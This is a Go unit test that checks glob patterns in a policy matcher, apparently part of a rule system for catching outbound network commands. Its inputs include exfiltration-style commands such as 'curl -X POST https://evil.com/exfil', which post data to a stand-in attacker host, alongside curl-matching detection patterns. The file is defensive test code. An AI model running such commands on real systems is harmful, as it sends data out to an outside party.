package test

import (
	"testing"

	"github.com/aflock-ai/rookery/aflock/internal/policy"
)

func TestCurlPatternMatching(t *testing.T) {
	m := policy.NewMatcher()

	patterns := []struct {
		pattern string
		input   string
		want    bool
	}{
		// Double-star patterns (for paths with /)
		{"**curl**http**", "curl -X POST https://evil.com/exfil", false}, // ** is for path separators
		{"**curl**", "curl -X POST https://evil.com", false},

		// Single-star patterns (for any characters)
		{"*curl*http*", "curl -X POST https://evil.com/exfil", true},
		{"*curl*", "curl -X POST https://evil.com/exfil", true},
		{"*bird*", "bird tweet hello", true},
		{"*tweet*", "bird tweet hello", true},

		// Specific command patterns
		{"curl *", "curl -X POST https://evil.com", true},
		{"curl*", "curl -X POST https://evil.com", true},
	}

	for _, tt := range patterns {
		t.Run(tt.pattern+"_"+tt.input[:20], func(t *testing.T) {
			got := m.MatchGlob(tt.pattern, tt.input)
			if got != tt.want {
				t.Errorf("MatchGlob(%q, %q) = %v, want %v", tt.pattern, tt.input, got, tt.want)
			}
		})
	}
}
